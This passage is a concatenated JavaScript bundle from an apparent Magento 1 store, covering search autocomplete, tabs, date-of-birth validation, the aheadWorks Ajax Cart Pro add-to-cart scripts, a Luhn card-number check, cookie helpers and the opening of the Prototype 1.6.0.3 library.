 * Quick Search form client model
 */
Varien.searchForm = Class.create();
Varien.searchForm.prototype = {
    initialize : function(form, field, emptyText){
        this.form   = $(form);
        this.field  = $(field);
        this.emptyText = emptyText;

        Event.observe(this.form,  'submit', this.submit.bind(this));
        Event.observe(this.field, 'focus', this.focus.bind(this));
        Event.observe(this.field, 'blur', this.blur.bind(this));
        this.blur();
    },

    submit : function(event){
        if (this.field.value == this.emptyText || this.field.value == ''){
            Event.stop(event);
            return false;
        }
        return true;
    },

    focus : function(event){
        if(this.field.value==this.emptyText){
            this.field.value='';
        }

    },

    blur : function(event){
        if(this.field.value==''){
            this.field.value=this.emptyText;
        }
    },

    initAutocomplete : function(url, destinationElement){
        new Ajax.Autocompleter(
            this.field,
            destinationElement,
            url,
            {
                paramName: this.field.name,
                method: 'get',
                minChars: 2,
                updateElement: this._selectAutocompleteItem.bind(this),
                onShow : function(element, update) {
                    if(!update.style.position || update.style.position=='absolute') {
                        update.style.position = 'absolute';
                        Position.clone(element, update, {
                            setHeight: false,
                            offsetTop: element.offsetHeight
                        });
                    }
                    Effect.Appear(update,{duration:0});
                }

            }
        );
    },

    _selectAutocompleteItem : function(element){
        if(element.title){
            this.field.value = element.title;
        }
        this.form.submit();
    }
}

Varien.Tabs = Class.create();
Varien.Tabs.prototype = {
  initialize: function(selector) {
    var self=this;
    $$(selector+' a').each(this.initTab.bind(this));
  },

  initTab: function(el) {
      el.href = 'javascript:void(0)';
      if ($(el.parentNode).hasClassName('active')) {
        this.showContent(el);
      }
      el.observe('click', this.showContent.bind(this, el));
  },

  showContent: function(a) {
    var li = $(a.parentNode), ul = $(li.parentNode);
    ul.getElementsBySelector('li', 'ol').each(function(el){
      var contents = $(el.id+'_contents');
      if (el==li) {
        el.addClassName('active');
        contents.show();
      } else {
        el.removeClassName('active');
        contents.hide();
      }
    });
  }
}

Varien.DOB = Class.create();
Varien.DOB.prototype = {
    initialize: function(selector, required, format) {
        var el        = $$(selector)[0];
        this.day      = Element.select($(el), '.dob-day input')[0];
        this.month    = Element.select($(el), '.dob-month input')[0];
        this.year     = Element.select($(el), '.dob-year input')[0];
        this.dob      = Element.select($(el), '.dob-full input')[0];
        this.advice   = Element.select($(el), '.validation-advice')[0];
        this.required = required;
        this.format   = format;

        this.day.validate = this.validate.bind(this);
        this.month.validate = this.validate.bind(this);
        this.year.validate = this.validate.bind(this);
        
        this.year.setAttribute('autocomplete','off');

        this.advice.hide();
    },

    validate: function() {
        var error = false;

        if (this.day.value=='' && this.month.value=='' && this.year.value=='') {
            if (this.required) {
                error = 'This date is a required value.';
            } else {
                this.dob.value = '';
            }
        } else if (this.day.value=='' || this.month.value=='' || this.year.value=='') {
            error = 'Please enter a valid full date.';
        } else {
            var date = new Date();
            if (this.day.value<1 || this.day.value>31) {
                error = 'Please enter a valid day (1-31).';
            } else if (this.month.value<1 || this.month.value>12) {
                error = 'Please enter a valid month (1-12).';
            } else if (this.year.value<1900 || this.year.value>date.getFullYear()) {
                error = 'Please enter a valid year (1900-'+date.getFullYear()+').';
            } else {
                this.dob.value = this.format.replace(/(%m|%b)/i, this.month.value).replace(/(%d|%e)/i, this.day.value).replace(/%y/i, this.year.value);
                var testDOB = this.month.value + '/' + this.day.value + '/'+ this.year.value;
                var test = new Date(testDOB);
                if (isNaN(test)) {
                    error = 'Please enter a valid date.';
                }
            }
        }

        if (error !== false) {
            try {
                this.advice.innerHTML = Translator.translate(error);
            }
            catch (e) {
                this.advice.innerHTML = error;
            }
            this.advice.show();
            return false;
        }

        this.advice.hide();
        return true;
    }
}

Validation.addAllThese([
    ['validate-custom', ' ', function(v,elm) {
        return elm.validate();
    }]
]);

function truncateOptions() {
    $$('.truncated').each(function(element){
        Event.observe(element, 'mouseover', function(){
            if (element.down('div.truncated_full_value')) {
                element.down('div.truncated_full_value').addClassName('show')
            }
        });
        Event.observe(element, 'mouseout', function(){
            if (element.down('div.truncated_full_value')) {
                element.down('div.truncated_full_value').removeClassName('show')
            }
        });

    });
}
Event.observe(window, 'load', function(){
   truncateOptions();
});

Element.addMethods({
    getInnerText: function(element)
    {
        element = $(element);
        if(element.innerText && !Prototype.Browser.Opera) {
            return element.innerText
        }
        return element.innerHTML.stripScripts().unescapeHTML().replace(/[\n\r\s]+/g, ' ').strip();
    }
});

if (!("console" in window) || !("firebug" in console))
{
    var names = ["log", "debug", "info", "warn", "error", "assert", "dir", "dirxml",
    "group", "groupEnd", "time", "timeEnd", "count", "trace", "profile", "profileEnd"];

    window.console = {};
    for (var i = 0; i < names.length; ++i)
        window.console[names[i]] = function() {}
}

/**
 * Executes event handler on the element. Works with event handlers attached by Prototype,
 * in a browser-agnostic fashion.
 * @param element The element object
 * @param event Event name, like 'change'
 *
 * @example fireEvent($('my-input', 'click'));
 */
function fireEvent(element, event){
    if (document.createEventObject){
        // dispatch for IE
        var evt = document.createEventObject();
        return element.fireEvent('on'+event,evt)
    }
    else{
        // dispatch for firefox + others
        var evt = document.createEvent("HTMLEvents");
        evt.initEvent(event, true, true ); // event type,bubbling,cancelable
        return !element.dispatchEvent(evt);
    }
}

var $wk=jQuery.noConflict();

$wk(document).ready(function(){
    $wk('.block-layered-nav,.category-products').equalHeights();
	//$wk('').equalHeights();
});


(function($){
    $.fn.equalHeights = function(){
        var max = 0;
        $(this).each(function(){
            if ($(this).height() > max) {
                max = $(this).height();
            }
        });
        if ($.browser.msie && $.browser.version == 6.0) {
            $(this).each(function() {
                $(this).css({
                    'height': max,
                    'min-height': max
                });
            });
        } else {
            $(this).each(function(){
                $(this).css({
                    'height': max
                });
            });
        }
    };
})(jQuery);


//<![CDATA[
            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Search entire store here...');
            searchForm.initAutocomplete('http://www.carncompany.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
        //]]>
/**
 * aheadWorks Co.
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the EULA
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://ecommerce.aheadworks.com/LICENSE-M1.txt
 *
 * @category   AW
 * @package    AW_Ajaxcartpro
 * @copyright  Copyright (c) 2009-2010 aheadWorks Co. (http://www.aheadworks.com)
 * @license    http://ecommerce.aheadworks.com/LICENSE-M1.txt
 */
 

Prototype.Browser.IE6 = Prototype.Browser.IE && parseInt(navigator.userAgent.substring(navigator.userAgent.indexOf("MSIE")+5)) == 6;
Prototype.Browser.IE7 = Prototype.Browser.IE && parseInt(navigator.userAgent.substring(navigator.userAgent.indexOf("MSIE")+5)) == 7;
Prototype.Browser.IE8 = Prototype.Browser.IE && !Prototype.Browser.IE6 && !Prototype.Browser.IE7;

window.ACPTop = 200;
 
if(!Prototype.Browser.IE6){

    setLocation = function(url){
        if(window.location.href.match('https://') && !url.match('https://')){
            url = url.replace('http://','https://')
        }
        if(AW_ACP.isCartPage && ((url.search('/add') != -1 ) || (url.search('/remove') != -1 )) ){
            ajaxcartsend(url+'awacp/1/is_checkout/1', 'url', '', '');
        }else if (url.search('checkout/cart/add') != -1){
            ajaxcartsend(url+'awacp/1', 'url', '', '');
        }else if (url.search('wishlist/index/cart') != -1){
			if (url.match(/\?/)) {
	            ajaxcartsendwishlist(url+'&awwishl=1&awacp=1', 'url', '', '');
			}
			else {
	            ajaxcartsendwishlist(url+'awwishl/1/awacp/1', 'url', '', '');
			}
        }else if (url.search('options=cart') != -1){
            ajaxcartsendconfigurable(url);
        }
        else
        {
            window.location.href = url;
        }
    }
}

function addSubmitEvent()
{
    if (typeof productAddToCartForm != 'undefined')
    {
        productAddToCartForm.submit = function(url){
            if(this.validator && this.validator.validate()){
                ajaxcartsend('?awacp=1', 'form', this, '');
            }
            return false;
        }

        productAddToCartForm.form.onsubmit = function() {
            productAddToCartForm.submit();
            return false;
        };
    }
}

function addAcpSubmitEvent()
{
    if (typeof productAddToCartFormAcp != 'undefined')
    {
        productAddToCartFormAcp.submit = function(url){
            if(this.validator && this.validator.validate()){
                if (AW_ACP.isCartPage)
                    ajaxcartsend('?awacp=1&is_checkout=1', 'form', this, '');
                else
                    ajaxcartsend('?awacp=1', 'form', this, '');
            }
            return false;
        }

        productAddToCartFormAcp.form.onsubmit = function() {
            productAddToCartFormAcp.submit();
            return false;
        };
    }
}

if(!Prototype.Browser.IE6){

    var cnt1 = 20;
	__intId = setInterval(
		/* Hangs event listener for @ADD TO CART@ links*/
		function(){
			cnt1--;
			if(typeof productAddToCartForm != 'undefined'){
				try {
					// This fix is applied to magento <1.3.1
                    $$('#product_addtocart_form '+aw_addToCartButtonClass).each(function(el){
                        el.setAttribute('type', 'button')
                    })
				}catch(err){
					
				}
				
                if (AW_ACP.hasFileOption == false) addSubmitEvent();
                
				clearInterval(__intId);
			}
			if(!cnt1) clearInterval(__intId);
		},
		500
	);



	var cnt2 = 20;
	__intId2 = setInterval(
		/* This hangs event listener on @DELETE@ items from cart*/
		function(){	
			cnt2--;
			if(typeof aw_cartDivClass!= 'undefined' && $$(aw_cartDivClass).length || ((typeof AW_ACP !== 'undefined') && AW_ACP.isCartPage)){
                updateDeleteLinks();
				clearInterval(__intId2);
			}
			if(!cnt2) clearInterval(__intId);
		},
		500
	);
}





function setPLocation(url, setFocus){
    if (url.search('checkout/cart/add') != -1){ //CART ADD
        window.opener.focus();

        if (url[url.length-1] == '/') delim = '';
        else delim = '/';

        if (window.opener.location.pathname.search('checkout/cart') == -1)
            window.opener.ajaxcartsend(url+delim+'awacp/1', 'url', '');
        else
            window.opener.ajaxcartsend(url+delim+'awacp/1/is_checkout/1', 'url', '');
	}
	else{
		if(setFocus) {
			window.opener.focus();
		}
        window.opener.location.href = url;
	}
}

function ajaxcartsendwishlist(url, type, obj){
    url = getCommonUrl(url);
    showProgressAnimation();
    new Ajax.Request(url, {
          onSuccess: function(resp){
                try{
                    if (typeof(resp.responseText) == 'string') eval('resp = ' + resp.responseText);
				}catch(e){
					win.location.href=url;
					hideProgressAnimation();
					return;
				}
                hideProgressAnimation();
				if (resp.r != 'success'){
                    if (resp.redirect)
                        win.location.href = resp.redirect;
                    else
                        win.location.href=url;
                }
				else{
					if(AW_ACP.useConfirmation){	
						showConfirmDialog(resp.product_name);
					}
					__onACPRender();
					updateCartView(resp);
                    updateTopLinks(resp);
                    updateWishlist(resp);
                    updateWishlistTopLinks(resp);
                    updateAddLinks();
				}
			}
        });
}

function ajaxcartsend(url, type, obj){
    url = getCommonUrl(url)
	
	showProgressAnimation();
	if (type == 'form'){		
		var aForm = $('product_addtocart_form_acp') ? $('product_addtocart_form_acp') : $('product_addtocart_form');
        aForm.action += url;

        aForm.request({
            onComplete:  function(resp){

                if (typeof(resp.responseText) == 'string'){
                    try{
                        eval('resp = ' + resp.responseText);
                    }catch(e){
                        if (obj.form.submit()){
                            return;
                        }
                        else{
                            win.location.href = obj.form.action;
                            return;
                        }
                    }
                }
				hideProgressAnimation();
				if (resp.r != 'success'){
					obj.form.submit();
				}
				else{
					__onACPRender();
                    if(AW_ACP.useConfirmation && (url.search('is_checkout/1') != 1)){
						showConfirmDialog(resp.product_name);
					}
					updateCartView(resp);
				}
			}
        })

	}
	if (type == 'url'){
		new Ajax.Request(url, {
          onSuccess: function(resp){
				try{
					if (typeof(resp.responseText) == 'string') eval('resp = ' + resp.responseText);
				}catch(e){
					win.location.href=url;
					hideProgressAnimation();
					return;
				}
				hideProgressAnimation();
                if (resp.r != 'success'){
					win.location.href=url;
				}
				else{		
                    if(AW_ACP.useConfirmation && (url.search('is_checkout/1') == -1)){
						showConfirmDialog(resp.product_name);
					}
					__onACPRender();
					updateCartView(resp);
				}
			}
        });

	}
}

function __onACPRender(){
    if(AW_ACP.onRender && AW_ACP.onRender.length){
	$A(AW_ACP.onRender).each(function(h){h(AW_ACP)})
    }
}

function addEffectACP(obj, effect)
{
    if (effect == 'opacity'){
        $(obj).hide();
        new Effect.Appear(obj);

	}
	if (effect == 'grow'){
        $(obj).hide();
        new Effect.BlindDown(obj);
	}
	if (effect == 'blink'){
        new Effect.Pulsate(obj);
	}
}


function updateDeleteLinks(){
	var tmpLinks = document.links;
	for (i=0; i<tmpLinks.length; i++){
		if (tmpLinks[i].href.search('checkout/cart/delete') != -1){
			url = tmpLinks[i].href.replace(/\/uenc\/.+,/g, "");
			var del = url.match(/delete\/id\/\d+\//g);
			var id = del[0].match(/\d+/g);
			if (window.location.protocol == 'https:'){
				aw_base_url = aw_base_url.replace("http:", "https:");
			}	
			if(!AW_ACP.isCartPage){
				tmpLinks[i].href = 'javascript:ajaxcartprodelete("' + aw_base_url + 'ajaxcartpro/cart/remove/id/' + id +'")';
			}else{
				tmpLinks[i].href = 'javascript:ajaxcartprodelete("' + aw_base_url + 'ajaxcartpro/cart/remove/id/' + id +'/is_checkout/1")';
			}
		}
	}
}

function updateTopLinks(resp){
    if($$(aw_topLinkCartClass).length){
        $$(aw_topLinkCartClass)[0].title = $$(aw_topLinkCartClass)[0].innerHTML = resp.links;
    }
}

function updateWishlistTopLinks(resp){
    if($$(aw_topWishlistLinkCartClass).length){
        $$(aw_topWishlistLinkCartClass)[0].innerHTML = resp.wishlist_links;
    }
}

window.updateBigCartView = function (resp){

    $$(aw_bigCartClass)[0].innerHTML = resp.cart
	if($('shopping-cart-table')){
		decorateTable('shopping-cart-table')
	}

    updateDeleteLinks();
	updateTopLinks(resp);
	updateAddLinks();
	
	var scripts = resp.cart.extractScripts();
    for (var i=0; i<scripts.length; i++)
    {
        if (typeof(scripts[i]) != 'undefined')
        {
            try
            {
                eval(scripts[i].replace(/var /gi, ""));
            } catch(e){ }
        }
    }
	
}

function showProgressAnimation(){
    alignBlock($$('.ajaxcartpro_progress')[0], 260, 50, 'progress');
}

function showConfirmDialog(product_name){
    if (product_name) $('acp_product_name').innerHTML = product_name;
    block = $$('.ajaxcartpro_confirm')[0];
    alignBlock(block, 260, 104, 'confirmation');
    block.style.display = 'block';
    if (typeof($$('.ajaxcartpro_confirm .focus')[0]) != 'undefined') $$('.ajaxcartpro_confirm .focus')[0].focus();

    var ACPcountdown = $('ACPcountdown');
    if(typeof ACPcountdown != 'undefined' && AW_ACP.counterBegin>0)
    {
        ACPcountdown.innerHTML = AW_ACP.counterBegin;
        if (typeof __intId3 != 'undefined') clearInterval(__intId3);
        __intId3 = setInterval(
            function(){
                if ( parseInt(ACPcountdown.innerHTML) ){
                    ACPcountdown.innerHTML = parseInt(ACPcountdown.innerHTML)-1;
                }
                else
                { 
                    clearInterval(__intId3);
                    block.style.display = "none";
                    ACPcountdown.innerHTML = AW_ACP.counterBegin;
                }

            },
            1000
        );
    }
}

function hideProgressAnimation(){

	$$('.ajaxcartpro_progress')[0].style.display = 'none';
}

if(!Prototype.Browser.IE6){
    document.observe("dom:loaded", function() {
		updateAddLinks()
		
		// Some other onclicks
		$('aw_acp_continue').onclick = function(e){
			e = e||event;
			if(e.preventDefault)
				e.preventDefault()
			$$('.ajaxcartpro_confirm')[0].style.display='none';return false;
		}
		
		$('aw_acp_checkout').onclick = function(e){
			$$('.ajaxcartpro_confirm')[0].style.display='none';return true;
		}	
		
		// Test for minicart
		
		if((typeof aw_cartDivClass != 'undefined') && ($$(aw_cartDivClass).length || ((typeof AW_ACP !== 'undefined') && AW_ACP.isCartPage))){
			updateDeleteLinks();
		}
		
	})
}

function updateAddLinks(){
	var ats = document.links;
	for (i=ats.length-1; i>=0; i--){
		if (ats[i].href.search('checkout/cart/add') != -1){
			ats[i].onclick = function(link){
				return function(){
					setLocation(link)
				}
			}(ats[i].href);
			ats[i].href="javascript:void(0)";
		}
        if (ats[i].href.search('wishlist/index/cart') != -1){
			ats[i].onclick = function(link){
				return function(){
					setLocation(link)
				}
			}(ats[i].href);
			ats[i].href="javascript:void(0)";
		}
	}
}

function getCommonUrl(url){
	if(window.location.href.match('www.') && url.match('http://') && !url.match('www.')){
		url = url.replace('http://', 'http://www.');
	}else if(!window.location.href.match('www.') && url.match('http://') && url.match('www.')){
		url = url.replace('www.', '');
	}
	return url;
}

var productAddToCartFormAcp;
function ajaxcartsendconfigurable(url)
{
    showProgressAnimation();
    urlToSend = url + '&ajaxcartpro=1';
    new Ajax.Request(urlToSend, {
          onSuccess: function(resp){
                if (resp.responseText == 'false')
                {
                    window.location = url;
                }
                else
                { 
                    tmpDiv = win.document.createElement('div');
                    var scripts = resp.responseText.extractScripts();

                    tmpDiv.innerHTML = resp.responseText.stripScripts();
                    win.document.body.appendChild(tmpDiv);
                    
                    showOptionsDialog();
                    hideProgressAnimation();

                    productAddToCartFormAcp = new VarienForm('product_addtocart_form_acp');
                    decorateGeneric($$('#product-options-wrapper dl'), ['last']);
                    addAcpSubmitEvent();
                    if (typeof($$('#acp_configurable_block .focus')[0]) != 'undefined') $$('#acp_configurable_block .focus')[0].focus();
                    
                    for (var i=0; i<scripts.length; i++)
                    {
                        if (typeof(scripts[i]) != 'undefined')
                        {
                            eval(scripts[i]);
                        }
                    }
                }
			}
        });
}

function showOptionsDialog()
{
    __height = $('acp_product_options').offsetHeight;
    
    if (__height > 400)
	__height = 400;

    alignBlock($('acp_product_options'), 400, __height, 'custom_options');
}

function alignBlock(block, width, height, blockType)
{
    if (blockType == 'confirmation' && !AW_ACP.useConfirmation)
        return false;

    if (blockType == 'progress' && !AW_ACP.useProgress)
        return false;
		
	console.log(jQuery('body').width());

    block.style.display = 'block';
    block.style.width = width + 'px';
    block.style.height = height + 'px';
    block.style.left = document.viewport.getWidth()/2 - width/2 + 'px';
    
	if (Prototype.Browser.IE && !navigator.appVersion.match("8||9")){
		block.style.position = 'absolute';
		window.ACPTop = 200;
	}
	if (aw_ajaxcartpro_proganim == 'center'){
		if (!(Prototype.Browser.IE && !navigator.appVersion.match("8||9"))){
            block.style.top = (document.viewport.getHeight()/2 - height/2) + 'px';
		}else{
            window.ACPTop = 200;
        }
		}
	if (aw_ajaxcartpro_proganim == 'top'){
		if (!(Prototype.Browser.IE && !navigator.appVersion.match("8||9"))){
		    block.style.top = '0px';
		}else{
		     // IE7-
		    window.ACPTop = 0;
		}
	}
	if (aw_ajaxcartpro_proganim == 'bottom'){

		block.style.bottom = '0px';
	}
}

function validateDownloadableCallback(elmId, result)
{
    var container = $('downloadable-links-list');
    if (result == 'failed') {
        container.removeClassName('validation-passed');
        container.addClassName('validation-failed');
    } else {
        container.removeClassName('validation-failed');
        container.addClassName('validation-passed');
    }
}

function validateOptionsCallback(elmId, result)
{
    var container = $(elmId).up('ul.options-list');
    if (result == 'failed') {
        container.removeClassName('validation-passed');
        container.addClassName('validation-failed');
    } else {
        container.removeClassName('validation-failed');
        container.addClassName('validation-passed');
    }
}

function acpSubmit()
{
    if(productAddToCartFormAcp.validator&&productAddToCartFormAcp.validator.validate())
    {
        productAddToCartFormAcp.submit();
        $('acp_configurable_block').remove();
    }
}

//<![CDATA[
        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
    //]]>
// Credit Card Validation Javascript
// copyright 12th May 2003, by Stephen Chapman, Felgall Pty Ltd

// You have permission to copy and use this javascript provided that
// the content of the script is not changed in any way.

function validateCreditCard(s) {
    // remove non-numerics
    var v = "0123456789";
    var w = "";
    for (i=0; i < s.length; i++) {
        x = s.charAt(i);
        if (v.indexOf(x,0) != -1)
        w += x;
    }
    // validate number
    j = w.length / 2;
    k = Math.floor(j);
    m = Math.ceil(j) - k;
    c = 0;
    for (i=0; i<k; i++) {
        a = w.charAt(i*2+m) * 2;
        c += a > 9 ? Math.floor(a/10 + a%10) : a;
    }
    for (i=0; i<k+m; i++) c += w.charAt(i*2+1-m) * 1;
    return (c%10 == 0);
}


/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Academic Free License (AFL 3.0)
 * that is bundled with this package in the file LICENSE_AFL.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/afl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category    Mage
 * @package     js
 * @copyright   Copyright (c) 2010 Magento Inc. (http://www.magentocommerce.com)
 * @license     http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
 */
// old school cookie functions grabbed off the web

if (!window.Mage) var Mage = {};

Mage.Cookies = {};
Mage.Cookies.expires  = null;
Mage.Cookies.path     = '/';
Mage.Cookies.domain   = null;
Mage.Cookies.secure   = false;
Mage.Cookies.set = function(name, value){
     var argv = arguments;
     var argc = arguments.length;
     var expires = (argc > 2) ? argv[2] : Mage.Cookies.expires;
     var path = (argc > 3) ? argv[3] : Mage.Cookies.path;
     var domain = (argc > 4) ? argv[4] : Mage.Cookies.domain;
     var secure = (argc > 5) ? argv[5] : Mage.Cookies.secure;
     document.cookie = name + "=" + escape (value) +
       ((expires == null) ? "" : ("; expires=" + expires.toGMTString())) +
       ((path == null) ? "" : ("; path=" + path)) +
       ((domain == null) ? "" : ("; domain=" + domain)) +
       ((secure == true) ? "; secure" : "");
};

Mage.Cookies.get = function(name){
    var arg = name + "=";
    var alen = arg.length;
    var clen = document.cookie.length;
    var i = 0;
    var j = 0;
    while(i < clen){
        j = i + alen;
        if (document.cookie.substring(i, j) == arg)
            return Mage.Cookies.getCookieVal(j);
        i = document.cookie.indexOf(" ", i) + 1;
        if(i == 0)
            break;
    }
    return null;
};

Mage.Cookies.clear = function(name) {
  if(Mage.Cookies.get(name)){
    document.cookie = name + "=" +
    "; expires=Thu, 01-Jan-70 00:00:01 GMT";
  }
};

Mage.Cookies.getCookieVal = function(offset){
   var endstr = document.cookie.indexOf(";", offset);
   if(endstr == -1){
       endstr = document.cookie.length;
   }
   return unescape(document.cookie.substring(offset, endstr));
};

/*  Prototype JavaScript framework, version 1.6.0.3
 *  (c) 2005-2008 Sam Stephenson
 *
 *  Prototype is freely distributable under the terms of an MIT-style license.
 *  For details, see the Prototype web site: http://www.prototypejs.org/
 *
 *--------------------------------------------------------------------------*/

var Prototype = {
  Version: '1.6.0.3',

  Browser: {
    IE:     !!(window.attachEvent &&
      navigator.userAgent.indexOf('Opera') === -1),
    Opera:  navigator.userAgent.indexOf('Opera') > -1,
    WebKit: navigator.userAgent.indexOf('AppleWebKit/') > -1,
    Gecko:  navigator.userAgent.indexOf('Gecko') > -1 &&
      navigator.userAgent.indexOf('KHTML') === -1,
    MobileSafari: !!navigator.userAgent.match(/Apple.*Mobile.*Safari/)
  },

  BrowserFeatures: {
    XPath: !!document.evaluate,
    SelectorsAPI: !!document.querySelector,
    ElementExtensions: !!window.HTMLElement,
    SpecificElementExtensions:
      document.createElement('div')['__proto__'] &&
      document.createElement('div')['__proto__'] !==
        document.createElement('form')['__proto__']
  },

  ScriptFragment: '<script[^>]*>([\\S\\s]*?)<\/script>',
  JSONFilter: /^\/\*-secure-([\s\S]*)\*\/\s*$/,

  emptyFunction: function() { },
  K: function(x) { return x }
};

if (Prototype.Browser.MobileSafari)
  Prototype.BrowserFeatures.SpecificElementExtensions = false;


/* Based on Alex Arnell's inheritance implementation. */
var Class = {
  create: function() {
    var parent = null, properties = $A(arguments);
    if (Object.isFunction(properties[0]))
      parent = properties.shift();

    function klass() {
      this.initialize.apply(this, arguments);
    }

    Object.extend(klass, Class.Methods);
    klass.superclass = parent;
    klass.subclasses = [];

    if (parent) {
      var subclass = function() { };
      subclass.prototype = parent.prototype;
      klass.prototype = new subclass;
      parent.subclasses.push(klass);
    }

    for (var i = 0; i < properties.length; i++)
      klass.addMethods(properties[i]);

    if (!klass.prototype.initialize)
      klass.prototype.initialize = Prototype.emptyFunction;

    klass.prototype.constructor = klass;

    return klass;
  }
};

Class.Methods = {
  addMethods: function(source) {
    var ancestor   = this.superclass && this.superclass.prototype;
    var properties = Object.keys(source);

    if (!Object.keys({ toString: true }).length)
      properties.push("toString", "valueOf");

    for (var i = 0, length = properties.length; i < length; i++) {
      var property = properties[i], value = source[property];
      if (ancestor && Object.isFunction(value) &&
          value.argumentNames().first() == "$super") {
        var method = value;
        value = (function(m) {
          return function() { return ancestor[m].apply(this, arguments) };
        })(property).wrap(method);

        value.valueOf = method.valueOf.bind(method);
        value.toString = method.toString.bind(method);
      }
      this.prototype[property] = value;
    }

    return this;
  }
};

var Abstract = { };

Object.extend = function(destination, source) {
  for (var property in source)
    destination[property] = source[property];
  return destination;
};

Object.extend(Object, {
  inspect: function(object) {
    try {
      if (Object.isUndefined(object)) return 'undefined';
      if (object === null) return 'null';
      return object.inspect ? object.inspect() : String(object);
    } catch (e) {
      if (e instanceof RangeError) return '...';
      throw e;
    }
  },

  toJSON: function(object) {
    var type = typeof object;
    switch (type) {
      case 'undefined':
      case 'function':
      case 'unknown': return;
      case 'boolean': return object.toString();
    }

    if (object === null) return 'null';
    if (object.toJSON) return object.toJSON();
    if (Object.isElement(object)) return;

    var results = [];
    for (var property in object) {
      var value = Object.toJSON(object[property]);
      if (!Object.isUndefined(value))
        results.push(property.toJSON() + ': ' + value);
    }

    return '{' + results.join(', ') + '}';
  },

  toQueryString: function(object) {
    return $H(object).toQueryString();
  },

  toHTML: function(object) {
    return object && object.toHTML ? object.toHTML() : String.interpret(object);
  },

  keys: function(object) {
    var keys = [];
    for (var property in object)
      keys.push(property);
    return keys;
  },

  values: function(object) {
    var values = [];
    for (var property in object)
      values.push(object[property]);
    return values;
  },

  clone: function(object) {
    return Object.extend({ }, object);
  },

  isElement: function(object) {
    return !!(object && object.nodeType == 1);
  },

  isArray: function(object) {
    return object != null && typeof object == "object" &&
      'splice' in object && 'join' in object;
  },

  isHash: function(object) {
    return object instanceof Hash;
  },

  isFunction: function(object) {
    return typeof object == "function";
  },

  isString: function(object) {
    return typeof object == "string";
  },

  isNumber: function(object) {
    return typeof object == "number";
  },

  isUndefined: function(object) {
    return typeof object == "undefined";
  }
});

Object.extend(Function.prototype, {
  argumentNames: function() {
    var names = this.toString().match(/^[\s\(]*function[^(]*\(([^\)]*)\)/)[1]
      .replace(/\s+/g, '').split(',');
    return names.length == 1 && !names[0] ? [] : names;
  },

  bind: function() {
    if (arguments.length < 2 && Object.isUndefined(arguments[0])) return this;
    var __method = this, args = $A(arguments), object = args.shift();
    return function() {
      return __method.apply(object, args.concat($A(arguments)));
    }
  },

  bindAsEventListener: function() {
    var __method = this, args = $A(arguments), object = args.shift();
    return function(event) {
      return __method.apply(object, [event || window.event].concat(args));
    }
  },

  curry: function() {
    if (!arguments.length) return this;
    var __method = this, args = $A(arguments);
    return function() {
      return __method.apply(this, args.concat($A(arguments)));
    }
  },

  delay: function() {
    var __method = this, args = $A(arguments), timeout = args.shift() * 1000;
    return window.setTimeout(function() {
      return __method.apply(__method, args);
    }, timeout);
  },

  defer: function() {
    var args = [0.01].concat($A(arguments));
    return this.delay.apply(this, args);
  },

  wrap: function(wrapper) {
    var __method = this;
    return function() {
      return wrapper.apply(this, [__method.bind(this)].concat($A(arguments)));
    }
  },

  methodize: function() {
    if (this._methodized) return this._methodized;
    var __method = this;
    return this._methodized = function() {
      return __method.apply(null, [this].concat($A(arguments)));
    };
  }
});

Date.prototype.toJSON = function() {
  return '"' + this.getUTCFullYear() + '-' +
    (this.getUTCMonth() + 1).toPaddedString(2) + '-' +
    this.getUTCDate().toPaddedString(2) + 'T' +
    this.getUTCHours().toPaddedString(2) + ':' +
    this.getUTCMinutes().toPaddedString(2) + ':' +
    this.getUTCSeconds().toPaddedString(2) + 'Z"';
};

var Try = {
  these: function() {
    var returnValue;

    for (var i = 0, length = arguments.length; i < length; i++) {
      var lambda = arguments[i];
      try {
        returnValue = lambda();
        break;
      } catch (e) { }
    }

    return returnValue;
  }
};

RegExp.prototype.match = RegExp.prototype.test;

RegExp.escape = function(str) {
  return String(str).replace(/([.*+?^=!:${}()|[\]\/\\])/g, '\\$1');
};

/*--------------------------------------------------------------------------*/

var PeriodicalExecuter = Class.create({
  initialize: function(callback, frequency) {
    this.callback = callback;
    this.frequency = frequency;
    this.currentlyExecuting = false;

    this.registerCallback();
  },

  registerCallback: function() {
    this.timer = setInterval(this.onTimerEvent.bind(this), this.frequency * 1000);
  },

  execute: function() {
    this.callback(this);
  },

  stop: function() {
    if (!this.timer) return;
    clearInterval(this.timer);
    this.timer = null;
  },

  onTimerEvent: function() {
    if (!this.currentlyExecuting) {
      try {
        this.currentlyExecuting = true;
        this.execute();
      } finally {
        this.currentlyExecuting = false;
      }
    }
  }
});
Object.extend(String, {
  interpret: function(value) {
    return value == null ? '' : String(value);
  },
  specialChar: {
    '\b': '\\b',
    '\t': '\\t',
    '\n': '\\n',
    '\f': '\\f',
    '\r': '\\r',
    '\\': '\\\\'
  }
});

Object.extend(String.prototype, {
  gsub: function(pattern, replacement) {
    var result = '', source = this, match;
    replacement = arguments.callee.prepareReplacement(replacement);

    while (source.length > 0) {
      if (match = source.match(pattern)) {
        result += source.slice(0, match.index);
        result += String.interpret(replacement(match));
        source  = source.slice(match.index + match[0].length);
      } else {
        result += source, source = '';
      }
    }
    return result;
  },

  sub: function(pattern, replacement, count) {
    replacement = this.gsub.prepareReplacement(replacement);
    count = Object.isUndefined(count) ? 1 : count;

    return this.gsub(pattern, function(match) {
      if (--count < 0) return match[0];
      return replacement(match);
    });
  },

  scan: function(pattern, iterator) {
    this.gsub(pattern, iterator);
    return String(this);
  },

  truncate: function(length, truncation) {
    length = length || 30;
    truncation = Object.isUndefined(truncation) ? '...' : truncation;
    return this.length > length ?
      this.slice(0, length - truncation.length) + truncation : String(this);
  },

  strip: function() {
    return this.replace(/^\s+/, '').replace(/\s+$/, '');
  },

  stripTags: function() {
